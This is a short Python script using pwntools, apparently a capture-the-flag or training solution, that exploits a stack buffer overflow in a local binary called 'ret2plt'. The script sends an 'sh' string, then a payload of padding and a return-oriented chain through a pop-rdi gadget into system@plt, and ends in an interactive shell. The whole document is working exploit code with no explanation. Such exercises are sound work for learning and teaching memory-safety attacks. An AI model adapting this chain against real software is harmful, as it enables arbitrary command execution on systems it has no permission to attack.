from pwn import *

r = process('./ret2plt')
raw_input()

pop_rdi  = 0x400733
sh_str   = 0x601070
#system_got = 0x601020
system = 0x400520
#ret = 0x4004fe


payload  = 'a' * 0x18
payload += p64(pop_rdi)
payload += p64(sh_str)
#payload += p64(ret)
#payload += p64(system_got)
payload += p64(system)

r.send('sh\x00')
r.recvuntil(': ')
r.send(payload)

r.interactive()
